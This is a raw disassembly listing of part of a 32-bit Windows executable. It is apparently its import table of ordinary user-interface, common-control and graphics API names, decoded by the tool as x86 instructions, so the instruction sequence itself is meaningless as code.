  412de6:	push   ebx
  412de7:	gs je  0x412e41
  412dea:	imul   ebp,DWORD PTR [esi+0x64],0x6f4c776f
  412df1:	outs   dx,BYTE PTR ds:[esi]
  412df2:	addr16 inc ecx
  412df4:	add    BYTE PTR [eax],al
  412df6:	adc    eax,0x6c655202
  412dfb:	gs popa 
  412dfd:	jae    0x412e64
  412dff:	inc    esp
  412e00:	inc    ebx
  412e01:	add    BYTE PTR [eax+eax*1],ah
  412e04:	inc    ebx
  412e05:	push   0x65676e61
  412e0a:	dec    ebp
  412e0b:	outs   dx,BYTE PTR gs:[esi]
  412e0d:	jne    0x412e66
  412e0f:	add    BYTE PTR [ebx],bh
  412e11:	add    BYTE PTR [ebx+0x68],al
  412e14:	arpl   WORD PTR gs:[ebx+0x4d],bp
  412e18:	outs   dx,BYTE PTR gs:[esi]
  412e1a:	jne    0x412e65
  412e1c:	je     0x412e83
  412e1e:	ins    DWORD PTR es:[edi],dx
  412e1f:	add    al,ch
  412e21:	add    DWORD PTR [edi+0x70],ecx
  412e24:	outs   dx,BYTE PTR gs:[esi]
  412e26:	dec    ecx
  412e27:	arpl   WORD PTR [edi+0x6e],bp
  412e2a:	add    BYTE PTR [eax],al
  412e2c:	mov    ds:0x57734901,al
  412e31:	imul   ebp,DWORD PTR [esi+0x64],0x6e55776f
  412e38:	imul   esp,DWORD PTR [ebx+0x6f],0xce006564
  412e3f:	add    DWORD PTR [ebp+0x65],ecx
  412e42:	jae    0x412eb7
  412e44:	popa   
  412e45:	addr16 gs inc edx
  412e48:	outs   dx,DWORD PTR ds:[esi]
  412e49:	js     0x412e8c
  412e4b:	add    BYTE PTR [ebp+0x61724400],dh
  412e51:	ja     0x412ea0
  412e53:	outs   dx,BYTE PTR gs:[esi]
  412e55:	jne    0x412e99
  412e57:	popa   
  412e58:	jb     0x412e5a
  412e5a:	inc    edx
  412e5b:	add    dl,BYTE PTR [ebx+0x65]
  412e5e:	je     0x412ea6
  412e60:	outs   dx,DWORD PTR ds:[esi]
  412e61:	jb     0x412ec8
  412e63:	addr16 jb 0x412ed5
  412e66:	jne    0x412ed6
  412e68:	fs push edi
  412e6a:	imul   ebp,DWORD PTR [esi+0x64],0xc200776f
  412e71:	add    dh,BYTE PTR [edi+0x76]
  412e74:	jae    0x412ee6
  412e76:	jb     0x412ee1
  412e78:	outs   dx,BYTE PTR ds:[esi]
  412e79:	je     0x412ee1
  412e7b:	push   edi
  412e7c:	add    BYTE PTR [eax],al
  412e7e:	mov    al,ds:0x57734901
  412e83:	imul   ebp,DWORD PTR [esi+0x64],0x776f
  412e8a:	push   ebp
  412e8b:	add    DWORD PTR [edi+0x65],eax
  412e8e:	je     0x412ee3
  412e90:	arpl   WORD PTR [edx+0x6f],si
  412e93:	ins    BYTE PTR es:[edi],dx
  412e94:	ins    BYTE PTR es:[edi],dx
  412e95:	push   eax
  412e96:	outs   dx,DWORD PTR ds:[esi]
  412e97:	jae    0x412e99
  412e99:	add    al,dh
  412e9b:	add    BYTE PTR [edi+0x65],al
  412e9e:	je     0x412ee1
  412ea0:	jae    0x412f1b
  412ea2:	outs   dx,BYTE PTR ds:[esi]
  412ea3:	arpl   WORD PTR [ebx+0x65],cx
  412ea6:	jns    0x412efb
  412ea8:	je     0x412f0b
  412eaa:	je     0x412f11
  412eac:	add    BYTE PTR [eax],al
  412eae:	or     eax,0x74654701
  412eb3:	inc    esp
  412eb4:	imul   esp,DWORD PTR [ecx+0x6c],0x6142676f
  412ebb:	jae    0x412f22
  412ebd:	push   ebp
  412ebe:	outs   dx,BYTE PTR ds:[esi]
  412ebf:	imul   esi,DWORD PTR [ebx+esi*2+0x0],0x5502a500
  412ec7:	jo     0x412f2d
  412ec9:	popa   
  412eca:	je     0x412f31
  412ecc:	push   edi
  412ecd:	imul   ebp,DWORD PTR [esi+0x64],0x776f
  412ed4:	or     eax,DWORD PTR [ecx]
  412ed6:	inc    edi
  412ed7:	gs je  0x412f1e
  412eda:	inc    ebx
  412edb:	inc    ebp
  412edc:	js     0x412ede
  412ede:	stos   DWORD PTR es:[edi],eax
  412edf:	add    DWORD PTR [edi+ebp*2+0x61],ecx
  412ee3:	fs inc ebx
  412ee5:	jne    0x412f59
  412ee7:	jae    0x412f58
  412ee9:	jb     0x412f2c
  412eeb:	add    BYTE PTR [edx+eax*1+0x53],bl
  412eef:	gs je  0x412f45
  412ef2:	arpl   WORD PTR [edx+0x6f],si
  412ef5:	ins    BYTE PTR es:[edi],dx
  412ef6:	ins    BYTE PTR es:[edi],dx
  412ef7:	push   edx
  412ef8:	popa   
  412ef9:	outs   dx,BYTE PTR ds:[esi]
  412efa:	add    BYTE PTR gs:[bx+si],al
  412efe:	cmp    DWORD PTR [eax],eax
  412f00:	inc    ebx
  412f01:	push   0x70557261
  412f06:	jo     0x412f6d
  412f08:	jb     0x412f61
  412f0a:	add    BYTE PTR [eax],al
  412f0c:	fwait
  412f0d:	add    dl,BYTE PTR [ebp+0x6e]
  412f10:	ins    BYTE PTR es:[edi],dx
  412f11:	outs   dx,DWORD PTR ds:[esi]
  412f12:	popa   
  412f13:	fs dec ebx
  412f15:	gs jns 0x412f7a
  412f18:	outs   dx,DWORD PTR ds:[esi]
  412f19:	popa   
  412f1a:	jb     0x412f80
  412f1c:	dec    esp
  412f1d:	popa   
  412f1e:	jns    0x412f8f
  412f20:	jne    0x412f96
  412f22:	add    BYTE PTR [eax],al
  412f24:	push   esi
  412f25:	add    DWORD PTR [edi+0x65],eax
  412f28:	je     0x412f7d
  412f2a:	arpl   WORD PTR [edx+0x6f],si
  412f2d:	ins    BYTE PTR es:[edi],dx
  412f2e:	ins    BYTE PTR es:[edi],dx
  412f2f:	push   edx
  412f30:	popa   
  412f31:	outs   dx,BYTE PTR ds:[esi]
  412f32:	add    BYTE PTR gs:[bx+si],al
  412f36:	ins    DWORD PTR es:[edi],dx
  412f37:	add    DWORD PTR [edi+0x65],eax
  412f3a:	je     0x412f93
  412f3c:	imul   ebp,DWORD PTR [esi+0x64],0x6f4c776f
  412f43:	outs   dx,BYTE PTR ds:[esi]
  412f44:	addr16 push edi
  412f46:	add    BYTE PTR [eax],al
  412f48:	add    BYTE PTR [ecx],0x49
  412f4b:	outs   dx,BYTE PTR ds:[esi]
  412f4c:	data16 ins BYTE PTR es:[edi],dx
  412f4e:	popa   
  412f4f:	je     0x412fb6
  412f51:	push   edx
  412f52:	arpl   WORD PTR gs:[eax+eax*1+0x16],si
  412f57:	add    dl,BYTE PTR [edx+0x65]
  412f5a:	ins    DWORD PTR es:[edi],dx
  412f5b:	outs   dx,DWORD PTR ds:[esi]
  412f5c:	jbe    0x412fc3
  412f5e:	dec    ebp
  412f5f:	outs   dx,BYTE PTR gs:[esi]
  412f61:	jne    0x412f63
  412f63:	add    BYTE PTR [ebx+0x61724400],ch
  412f69:	ja     0x412fac
  412f6b:	outs   dx,BYTE PTR ds:[esi]
  412f6c:	imul   ebp,DWORD PTR [ebp+0x61],0x52646574
  412f73:	arpl   WORD PTR gs:[ebx+esi*2+0x0],si
  412f78:	das    
  412f79:	add    dl,BYTE PTR [ebx+0x65]
  412f7c:	je     0x412fbf
  412f7e:	arpl   WORD PTR [ecx+ebp*2+0x76],si
  412f82:	gs push edi
  412f84:	imul   ebp,DWORD PTR [esi+0x64],0x9c00776f
  412f8b:	add    BYTE PTR [ecx+ebp*2+0x61],al
  412f8f:	ins    BYTE PTR es:[edi],dx
  412f90:	outs   dx,DWORD PTR ds:[esi]
  412f91:	addr16 inc edx
  412f93:	outs   dx,DWORD PTR ds:[esi]
  412f94:	js     0x412fe6
  412f96:	popa   
  412f97:	jb     0x412ffa
  412f99:	ins    DWORD PTR es:[edi],dx
  412f9a:	inc    ecx
  412f9b:	add    bh,ah
  412f9d:	add    BYTE PTR [esi+0x72],al
  412fa0:	popa   
  412fa1:	ins    DWORD PTR es:[edi],dx
  412fa2:	gs push edx
  412fa4:	arpl   WORD PTR gs:[eax+eax*1-0x68],si
  412fa9:	add    DWORD PTR [ecx+0x73],ecx
  412fac:	inc    esp
  412fad:	imul   esp,DWORD PTR [ecx+0x6c],0x654d676f
  412fb4:	jae    0x413029
  412fb6:	popa   
  412fb7:	addr16 gs push edi
  412fba:	add    BYTE PTR [eax],al
  412fbc:	xor    DWORD PTR [eax],eax
  412fbe:	inc    ebx
  412fbf:	push   0x72507261
  412fc4:	gs jbe 0x41301e
  412fc7:	add    BYTE PTR ds:0x74654701,dl
  412fcd:	inc    esi
  412fce:	outs   dx,DWORD PTR ds:[esi]
  412fcf:	jb     0x413036
  412fd1:	addr16 jb 0x413043
  412fd4:	jne    0x413044
  412fd6:	fs push edi
  412fd8:	imul   ebp,DWORD PTR [esi+0x64],0xb700776f
  412fdf:	add    dl,BYTE PTR [edi+0x61]
  412fe2:	imul   esi,DWORD PTR [esi+eax*2+0x6f],0x706e4972
  412fea:	jne    0x413060
  412fec:	dec    ecx
  412fed:	fs ins BYTE PTR es:[edi],dx
  412fef:	add    BYTE PTR gs:[eax],al
  412ff2:	push   edi
  412ff3:	add    dl,BYTE PTR [ebx+0x65]
  412ff6:	je     0x413048
  412ff8:	jb     0x413069
  412ffa:	jo     0x413053
  412ffc:	add    BYTE PTR [eax],al
  412ffe:	dec    eax
  412fff:	add    dl,BYTE PTR [ebx+0x65]
  413002:	je     0x413051
  413004:	outs   dx,BYTE PTR gs:[esi]
  413006:	jne    0x413008
  413008:	scas   al,BYTE PTR es:[edi]
  413009:	add    DWORD PTR [edi+ebp*2+0x61],ecx
  41300d:	fs inc ebx
  41300f:	jne    0x413083
  413011:	jae    0x413082
  413013:	jb     0x41306c
  413015:	add    BYTE PTR [edi+0x2],bl
  413018:	push   ebx
  413019:	gs je  0x41306f
  41301c:	jns    0x413091
  41301e:	inc    ebx
  41301f:	outs   dx,DWORD PTR ds:[esi]
  413020:	ins    BYTE PTR es:[edi],dx
  413021:	outs   dx,DWORD PTR ds:[esi]
  413022:	jb     0x413097
  413024:	add    BYTE PTR [eax],al
  413026:	xchg   esp,eax
  413027:	add    dl,BYTE PTR [edx+esi*2+0x61]
  41302b:	outs   dx,BYTE PTR ds:[esi]
  41302c:	jae    0x41309a
  41302e:	popa   
  41302f:	je     0x413096
  413031:	inc    ecx
  413032:	arpl   WORD PTR [ebx+0x65],sp
  413035:	ins    BYTE PTR es:[edi],dx
  413036:	gs jb  0x41309a
  413039:	je     0x4130aa
  41303b:	jb     0x413094
  41303d:	add    BYTE PTR [edi+0x66654400],cl
  413043:	push   edi
  413044:	imul   ebp,DWORD PTR [esi+0x64],0x7250776f
  41304b:	outs   dx,DWORD PTR ds:[esi]
  41304c:	arpl   WORD PTR [edi+0x0],dx
  41304f:	add    BYTE PTR [ecx+0x0],ah
  413052:	inc    ebx
  413053:	jb     0x4130ba
  413055:	popa   
  413056:	je     0x4130bd
  413058:	push   eax
  413059:	outs   dx,DWORD PTR ds:[esi]
  41305a:	jo     0x4130d1
  41305c:	jo     0x4130ab
  41305e:	outs   dx,BYTE PTR gs:[esi]
  413060:	jne    0x413062
  413062:	push   ecx
  413063:	add    dl,BYTE PTR [ebx+0x65]
  413066:	je     0x4130b8
  413068:	popa   
  413069:	jb     0x4130d0
  41306b:	outs   dx,BYTE PTR ds:[esi]
  41306c:	je     0x41306e
  41306e:	popf   
  41306f:	add    BYTE PTR [ecx+ebp*2+0x61],al
  413073:	ins    BYTE PTR es:[edi],dx
  413074:	outs   dx,DWORD PTR ds:[esi]
  413075:	addr16 inc edx
  413077:	outs   dx,DWORD PTR ds:[esi]
  413078:	js     0x4130ca
  41307a:	popa   
  41307b:	jb     0x4130de
  41307d:	ins    DWORD PTR es:[edi],dx
  41307e:	push   edi
  41307f:	add    BYTE PTR [edx+0x6c695402],cl
  413085:	gs push edi
  413087:	imul   ebp,DWORD PTR [esi+0x64],0x73776f
  41308e:	sub    DWORD PTR [eax],eax
  413090:	inc    ebx
  413091:	push   0x6f4c7261
  413096:	ja     0x4130fd
  413098:	jb     0x4130f1
  41309a:	add    BYTE PTR [eax],al
  41309c:	out    dx,eax
  41309d:	add    DWORD PTR [eax+0x65],edx
  4130a0:	imul   ecx,DWORD PTR gs:[ebp+0x65],0x73
  4130a5:	jae    0x413108
  4130a7:	addr16 gs push edi
  4130aa:	add    BYTE PTR [eax],al
  4130ac:	jne    0x4130af
  4130ae:	inc    edi
  4130af:	gs je  0x413109
  4130b2:	imul   ebp,DWORD PTR [esi+0x64],0x6554776f
  4130b9:	js     0x41312f
  4130bb:	inc    ecx
  4130bc:	add    BYTE PTR [eax],al
  4130be:	add    DWORD PTR ds:[edi+0x65],eax
  4130c2:	je     0x413111
  4130c4:	gs jae 0x41313a
  4130c7:	popa   
  4130c8:	addr16 gs push edi
  4130cb:	add    BYTE PTR ds:0x61684300,ch
  4130d1:	jb     0x413121
  4130d3:	gs js  0x41314a
  4130d6:	push   edi
  4130d7:	add    BYTE PTR [ecx+eax*1+0x64616f4c],bh
  4130de:	push   ebx
  4130df:	je     0x413153
  4130e1:	imul   ebp,DWORD PTR [esi+0x67],0x2800057
  4130e8:	push   ebx
  4130e9:	push   0x6957776f
  4130ee:	outs   dx,BYTE PTR ds:[esi]
  4130ef:	outs   dx,DWORD PTR fs:[esi]
  4130f1:	ja     0x413134
  4130f3:	jae    0x41316e
  4130f5:	outs   dx,BYTE PTR ds:[esi]
  4130f6:	arpl   WORD PTR [eax],ax
  4130f8:	add    BYTE PTR ss:[ebx+0x68],al
  4130fc:	popa   
  4130fd:	jb     0x413154
  4130ff:	jo     0x413171
  413101:	gs jb  0x413145
  413104:	add    BYTE PTR [eax],al
  413106:	sti    
  413107:	add    DWORD PTR [eax+0x74],edx
  41310a:	dec    ecx
  41310b:	outs   dx,BYTE PTR ds:[esi]
  41310c:	push   edx
  41310d:	arpl   WORD PTR gs:[eax+eax*1+0x0],si
  413112:	sbb    eax,DWORD PTR [eax]
  413114:	inc    ebx
  413115:	popa   
  413116:	ins    BYTE PTR es:[edi],dx
  413117:	ins    BYTE PTR es:[edi],dx
  413118:	push   edi
  413119:	imul   ebp,DWORD PTR [esi+0x64],0x7250776f
  413120:	outs   dx,DWORD PTR ds:[esi]
  413121:	arpl   WORD PTR [edi+0x0],dx
  413124:	lahf   
  413125:	add    BYTE PTR [ecx+ebp*2+0x73],al
  413129:	jo     0x41318c
  41312b:	je     0x413190
  41312d:	push   0x7373654d
  413132:	popa   
  413133:	addr16 gs inc ecx
  413136:	add    BYTE PTR [eax],al
  413138:	mov    BYTE PTR [edx],al
  41313a:	push   esp
  41313b:	popa   
  41313c:	bound  esp,QWORD PTR [edx+0x65]
  41313f:	fs push esp
  413141:	gs js  0x4131b8
  413144:	dec    edi
  413145:	jne    0x4131bb
  413147:	push   edi
  413148:	add    BYTE PTR [eax],al
  41314a:	sub    eax,DWORD PTR [edx]
  41314c:	push   ebx
  41314d:	outs   dx,BYTE PTR gs:[esi]
  41314f:	fs dec ebp
  413151:	gs jae 0x4131c7
  413154:	popa   
  413155:	addr16 gs push edi
  413158:	add    BYTE PTR [eax],al
  41315a:	add    DWORD PTR fs:[edi+0x65],eax
  41315e:	je     0x4131b5
  413160:	jo     0x4131c6
  413162:	popa   
  413163:	je     0x4131ca
  413165:	push   edx
  413166:	outs   dx,BYTE PTR ds:[si]
  413168:	add    BYTE PTR [eax],al
  41316a:	mov    eax,0x61724400
  41316f:	ja     0x4131c4
  413171:	je     0x4131d4
  413173:	je     0x4131da
  413175:	push   edi
  413176:	add    BYTE PTR [eax],al
  413178:	sub    eax,0x74654701
  41317d:	dec    ebp
  41317e:	outs   dx,BYTE PTR gs:[esi]
  413180:	jne    0x4131c5
  413182:	push   0x4d6b6365
  413187:	popa   
  413188:	jb     0x4131f5
  41318a:	inc    esp
  41318b:	imul   ebp,DWORD PTR [ebp+0x65],0x6f69736e
  413192:	outs   dx,BYTE PTR ds:[esi]
  413193:	jae    0x413195
  413195:	add    BYTE PTR [ebx+0x616f4c01],bh
  41319b:	fs push ebx
  41319d:	je     0x413211
  41319f:	imul   ebp,DWORD PTR [esi+0x67],0x2590041
  4131a6:	push   ebx
  4131a7:	gs je  0x4131fc
  4131aa:	arpl   WORD PTR gs:[ebp+eax*2+0x6d],si
  4131af:	jo     0x413225
  4131b1:	jns    0x4131b3
  4131b3:	add    BYTE PTR [edi+0x0],dl
  4131b6:	inc    ebx
  4131b7:	jb     0x41321e
  4131b9:	popa   
  4131ba:	je     0x413221
  4131bc:	inc    esp
  4131bd:	imul   esp,DWORD PTR [ecx+0x6c],0x6e49676f
  4131c4:	imul   esi,DWORD PTR fs:[edx+0x65],0x61507463
  4131cc:	jb     0x41322f
  4131ce:	ins    DWORD PTR es:[edi],dx
  4131cf:	push   edi
  4131d0:	add    BYTE PTR [eax],al
  4131d2:	cmp    BYTE PTR [eax],al
  4131d4:	inc    ebx
  4131d5:	push   0x70557261
  4131da:	jo     0x413241
  4131dc:	jb     0x413220
  4131de:	jne    0x413246
  4131e0:	push   di
  4131e2:	add    BYTE PTR [eax],al
  4131e4:	ja     0x4131e7
  4131e6:	inc    edi
  4131e7:	gs je  0x413241
  4131ea:	imul   ebp,DWORD PTR [esi+0x64],0x6554776f
  4131f1:	js     0x413267
  4131f3:	dec    esp
  4131f4:	outs   dx,BYTE PTR gs:[esi]
  4131f6:	addr16 je 0x413261
  4131f9:	push   edi
  4131fa:	add    BYTE PTR [eax],al
  4131fc:	xor    eax,0x61684300
  413201:	jb     0x413257
  413203:	outs   dx,DWORD PTR ds:[esi]
  413204:	dec    edi
  413205:	gs ins DWORD PTR es:[edi],dx
  413207:	push   edi
  413208:	add    BYTE PTR [eax],al
  41320a:	dec    edx
  41320b:	add    dl,BYTE PTR [ebx+0x65]
  41320e:	je     0x41325d
  413210:	outs   dx,BYTE PTR gs:[esi]
  413212:	jne    0x413258
  413214:	gs popaw 
  413217:	jne    0x413285
  413219:	je     0x413264
  41321b:	je     0x413282
  41321d:	ins    DWORD PTR es:[edi],dx
  41321e:	add    BYTE PTR [eax],al
  413220:	push   ebp
  413221:	push   ebx
  413222:	inc    ebp
  413223:	push   edx
  413224:	xor    esi,DWORD PTR [edx]
  413226:	cs fs ins BYTE PTR es:[edi],dx
  413229:	ins    BYTE PTR es:[edi],dx
  41322a:	add    BYTE PTR [eax],al
  41322c:	push   ebx
  41322d:	add    BYTE PTR [ecx+0x6d],cl
  413230:	popa   
  413231:	addr16 gs dec esp
  413234:	imul   esi,DWORD PTR [ebx+0x74],0x7465535f
  41323b:	dec    ecx
  41323c:	arpl   WORD PTR [edi+0x6e],bp
  41323f:	push   ebx
  413240:	imul   edi,DWORD PTR [edx+0x65],0x49005600
  413247:	ins    DWORD PTR es:[edi],dx
  413248:	popa   
  413249:	addr16 gs dec esp
  41324c:	imul   esi,DWORD PTR [ebx+0x74],0x6972575f
  413253:	je     0x4132ba
  413255:	add    BYTE PTR [esi+0x0],cl
  413258:	dec    ecx
  413259:	ins    DWORD PTR es:[edi],dx
  41325a:	popa   
  41325b:	addr16 gs dec esp
  41325e:	imul   esi,DWORD PTR [ebx+0x74],0x7065525f
  413265:	ins    BYTE PTR es:[edi],dx
  413266:	popa   
  413267:	arpl   WORD PTR [ebp+0x49],sp
  41326a:	arpl   WORD PTR [edi+0x6e],bp
  41326d:	add    BYTE PTR [esi],dh
  41326f:	add    BYTE PTR [ecx+0x6d],cl
  413272:	popa   
  413273:	addr16 gs dec esp
  413276:	imul   esi,DWORD PTR [ebx+0x74],0x6172445f
  41327d:	ja     0x41327f
  41327f:	add    BYTE PTR [ebx],dl
  413281:	add    BYTE PTR [ebx+0x72],al
  413284:	gs popa 
  413286:	je     0x4132ed
  413288:	push   eax
  413289:	jb     0x4132fa
  41328b:	jo     0x4132f2
  41328d:	jb     0x413303
  41328f:	jns    0x4132e4
  413291:	push   0x50746565
  413296:	popa   
  413297:	addr16 gs push edi
  41329a:	add    BYTE PTR [eax],al
  41329c:	pop    esp
  41329d:	add    BYTE PTR [eax+0x72],dl
  4132a0:	outs   dx,DWORD PTR ds:[esi]
  4132a1:	jo     0x413308
  4132a3:	jb     0x413319
  4132a5:	jns    0x4132fa
  4132a7:	push   0x57746565
  4132ac:	add    BYTE PTR [eax],al
  4132ae:	inc    ebx
  4132af:	dec    edi
  4132b0:	dec    ebp
  4132b1:	inc    ebx
  4132b2:	push   esp
  4132b3:	dec    esp
  4132b4:	xor    esi,DWORD PTR [edx]
  4132b6:	cs fs ins BYTE PTR es:[edi],dx
  4132b9:	ins    BYTE PTR es:[edi],dx
  4132ba:	add    BYTE PTR [eax],al
  4132bc:	mov    WORD PTR [eax],es
  4132be:	inc    ebx
  4132bf:	jb     0x413326
  4132c1:	popa   
  4132c2:	je     0x413329
  4132c4:	inc    ebx
  4132c5:	outs   dx,DWORD PTR ds:[esi]
  4132c6:	ins    DWORD PTR es:[edi],dx
  4132c7:	jo     0x41332a
  4132c9:	je     0x413334
  4132cb:	bound  ebp,QWORD PTR [ebp+eiz*2+0x42]
  4132cf:	imul   esi,DWORD PTR [ebp+ebp*2+0x61],0xa5000070
  4132d7:	add    BYTE PTR [ebx+0x72],al
  4132da:	gs popa 
  4132dc:	je     0x413343
  4132de:	push   eax
  4132df:	popa   
  4132e0:	ins    BYTE PTR es:[edi],dx
  4132e1:	gs je  0x413358
  4132e4:	add    BYTE PTR gs:[ebx+0x746e4901],dl
  4132eb:	gs jb  0x413361
  4132ee:	arpl   WORD PTR gs:[ebx+eax*2+0x6c],si
  4132f3:	imul   esi,DWORD PTR [eax+0x52],0x746365
  4132fa:	into   
  4132fb:	add    DWORD PTR [ebx+0x65],edx
  4132fe:	ins    BYTE PTR es:[edi],dx
  4132ff:	arpl   WORD PTR gs:[edi+ecx*2+0x62],si
  413304:	push   0x65
  413306:	arpl   WORD PTR [eax+eax*1+0x0],si
  41330a:	jp     0x41330d
  41330c:	inc    edi
  41330d:	gs je  0x413363
  413310:	jns    0x413385
  413312:	je     0x413379
  413314:	ins    DWORD PTR es:[edi],dx
  413315:	push   eax
  413316:	popa   
  413317:	ins    BYTE PTR es:[edi],dx
  413318:	gs je  0x41338f
  41331b:	gs push ebp
  41331d:	jae    0x413384
  41331f:	add    BYTE PTR [ecx+0x65724300],cl
  413325:	popa   
  413326:	je     0x41338d
  413328:	inc    edx
  413329:	jb     0x4133a0
  41332b:	jae    0x413395
  41332d:	dec    ecx
  41332e:	outs   dx,BYTE PTR ds:[esi]
  41332f:	imul   esi,DWORD PTR fs:[edx+0x65],0xe8007463
  413337:	add    DWORD PTR [ebx+0x65],edx
  41333a:	je     0x413389
  41333c:	popa   
  41333d:	jo     0x41338c
  41333f:	outs   dx,DWORD PTR ds:[esi]
  413340:	fs add BYTE PTR gs:[eax],al
  413344:	pop    esp
  413345:	add    DWORD PTR [edi+0x65],eax
  413348:	je     0x413396
  41334a:	popa   
  41334b:	jns    0x4133bc
  41334d:	jne    0x4133c3
  41334f:	add    bh,ch
  413351:	add    DWORD PTR [ebx+0x65],edx
  413354:	je     0x4133a6
  413356:	imul   edi,DWORD PTR [eax+0x65],0xc700006c
  41335d:	add    DWORD PTR [ebx+0x61],edx
  413360:	jbe    0x4133c7
  413362:	inc    esp
  413363:	inc    ebx
  413364:	add    BYTE PTR [eax],al
  413366:	pop    edi
  413367:	add    DWORD PTR [edi+0x65],eax
  41336a:	je     0x4133b9
  41336c:	popa   
  41336d:	jo     0x4133bc
  41336f:	outs   dx,DWORD PTR ds:[esi]
  413370:	fs add BYTE PTR gs:[eax],al
  413374:	mov    ds:0x65724300,al
  413379:	popa   
  41337a:	je     0x4133e1
  41337c:	dec    ecx
  41337d:	inc    ebx
  41337e:	push   edi
  41337f:	add    BYTE PTR [esi+0x65724300],dl
  413385:	popa   
  413386:	je     0x4133ed
  413388:	inc    ebp
  413389:	ins    BYTE PTR es:[edi],dx
  41338a:	ins    BYTE PTR es:[edi],dx
  41338b:	imul   esi,DWORD PTR [eax+0x74],0x67526369
  413392:	outs   dx,BYTE PTR ds:[esi]
  413393:	dec    ecx
  413394:	outs   dx,BYTE PTR ds:[esi]
  413395:	imul   esi,DWORD PTR fs:[edx+0x65],0x99007463
  41339d:	add    BYTE PTR [ebx+0x72],al
  4133a0:	gs popa 
  4133a2:	je     0x413409
  4133a4:	inc    esi
  4133a5:	outs   dx,DWORD PTR ds:[esi]
  4133a6:	outs   dx,BYTE PTR ds:[esi]
  4133a7:	je     0x4133ea
  4133a9:	add    BYTE PTR ds:0x61725402,cl
  4133af:	outs   dx,BYTE PTR ds:[esi]
  4133b0:	jae    0x41341e
  4133b2:	popa   
  4133b3:	je     0x41341a
  4133b5:	inc    ebx
  4133b6:	push   0x65737261
  4133bb:	je     0x413406
  4133bd:	outs   dx,BYTE PTR ds:[esi]
  4133be:	outs   dx,WORD PTR ds:[esi]
  4133c0:	add    BYTE PTR [eax],al
  4133c2:	out    dx,al
  4133c3:	add    DWORD PTR [ebx+0x65],edx
  4133c6:	je     0x413418
  4133c8:	popa   
  4133c9:	ins    BYTE PTR es:[edi],dx
  4133ca:	gs je  0x413441
  4133cd:	gs inc ebp
  4133cf:	outs   dx,BYTE PTR ds:[esi]
  4133d0:	je     0x413444
  4133d2:	imul   esp,DWORD PTR [ebp+0x73],0x5301d300
  4133d9:	gs je  0x41341e
  4133dc:	imul   esi,DWORD PTR [ebp+ebp*2+0x61],0x6d694470
  4133e4:	outs   dx,BYTE PTR gs:[esi]
  4133e6:	jae    0x413451
  4133e8:	outs   dx,DWORD PTR ds:[esi]
  4133e9:	outs   dx,BYTE PTR ds:[esi]
  4133ea:	inc    ebp
  4133eb:	js     0x4133ed
  4133ed:	add    BYTE PTR [esi],al
  4133ef:	add    dl,BYTE PTR [ebx+0x74]
  4133f2:	jb     0x413459
  4133f4:	je     0x413459
  4133f6:	push   0x746c42
  4133fb:	add    BYTE PTR [eax+eax*1+0x61657243],dl
  413402:	je     0x413469
  413404:	inc    esp
  413405:	imul   esi,DWORD PTR [ebx+0x63],0x61647261
  41340c:	bound  ebp,QWORD PTR [ebp+eiz*2+0x42]
  413410:	imul   esi,DWORD PTR [ebp+ebp*2+0x61],0x13f0070
  413418:	inc    edi
  413419:	gs je  0x413460
  41341c:	dec    ecx
  41341d:	inc    edx
  41341e:	inc    ebx
  41341f:	outs   dx,DWORD PTR ds:[esi]
  413420:	ins    BYTE PTR es:[edi],dx
  413421:	outs   dx,DWORD PTR ds:[esi]
  413422:	jb     0x413478
  413424:	popa   
  413425:	bound  ebp,QWORD PTR [ebp+eiz*2+0x0]
  413429:	add    BYTE PTR [edi+0x6e694c01],dl
  41342f:	gs push esp
  413431:	outs   dx,DWORD PTR ds:[esi]
  413432:	add    BYTE PTR [eax],al
  413434:	clc    
  413435:	add    DWORD PTR [ebx+0x65],edx
  413438:	je     0x41348e
  41343a:	gs js  0x4134b1
  41343d:	inc    ecx
  41343e:	ins    BYTE PTR es:[edi],dx
  41343f:	imul   esp,DWORD PTR [edi+0x6e],0x1a40000
  413446:	push   eax
  413447:	popa   
  413448:	je     0x41348c
  41344a:	ins    BYTE PTR es:[edi],dx
  41344b:	je     0x41344d
  41344d:	add    BYTE PTR [ebp+0x0],dh
  413450:	inc    edx
  413451:	imul   ebp,DWORD PTR gs:[bp+0x50],0x687461
  41345a:	test   al,0x0
  41345c:	inc    ebx
  41345d:	jb     0x4134c4
  41345f:	popa   
  413460:	je     0x4134c7
  413462:	push   eax
  413463:	outs   dx,BYTE PTR gs:[esi]
  413465:	dec    ecx
  413466:	outs   dx,BYTE PTR ds:[esi]
  413467:	imul   esi,DWORD PTR fs:[edx+0x65],0x83007463
  41346f:	add    DWORD PTR [edi+0x65],eax
  413472:	je     0x4134c8
  413474:	gs js  0x4134eb
  413477:	inc    ebp
  413478:	js     0x4134ee
  41347a:	outs   dx,BYTE PTR gs:[esi]
  41347c:	je     0x4134ce
  41347e:	outs   dx,DWORD PTR ds:[esi]
  41347f:	imul   ebp,DWORD PTR [esi+0x74],0x413233
  413486:	aam    0x1
  413488:	push   ebx
  413489:	gs je  0x4134ce
  41348c:	imul   eax,DWORD PTR [ebx+0x6f],0x6c
  413490:	outs   dx,DWORD PTR ds:[esi]
  413491:	jb     0x413493
  413493:	add    bl,dh
  413495:	add    DWORD PTR [ebx+0x65],edx
  413498:	je     0x4134ec
  41349a:	dec    edi
  41349b:	push   eax
  41349c:	xor    al,BYTE PTR [eax]
  41349e:	stos   BYTE PTR es:[edi],al
  41349f:	add    BYTE PTR [ebx+0x72],al
  4134a2:	gs popa 
  4134a4:	je     0x41350b
  4134a6:	push   eax
  4134a7:	outs   dx,DWORD PTR ds:[esi]
  4134a8:	ins    BYTE PTR es:[edi],dx
  4134a9:	jns    0x413512
  4134ab:	outs   dx,DWORD PTR ds:[esi]
  4134ac:	outs   dx,BYTE PTR ds:[esi]
  4134ad:	push   edx
  4134ae:	outs   dx,BYTE PTR ds:[si]
  4134b0:	add    BYTE PTR [eax],al
  4134b2:	xchg   DWORD PTR [ecx],eax
  4134b4:	inc    edi
  4134b5:	gs je  0x41350c
  4134b8:	gs js  0x41352f
  4134bb:	inc    ebp
  4134bc:	js     0x413532
  4134be:	outs   dx,BYTE PTR gs:[esi]
  4134c0:	je     0x413512
  4134c2:	outs   dx,DWORD PTR ds:[esi]
  4134c3:	imul   ebp,DWORD PTR [esi+0x74],0x2010057
  4134ca:	push   ebx
  4134cb:	gs je  0x413525
  4134ce:	imul   ebp,DWORD PTR [esi+0x64],0x724f776f
  4134d5:	addr16 inc ebp
  4134d7:	js     0x4134d9
  4134d9:	add    BYTE PTR [edi+0x65724300],ah
  4134df:	popa   
  4134e0:	je     0x413547
  4134e2:	push   eax
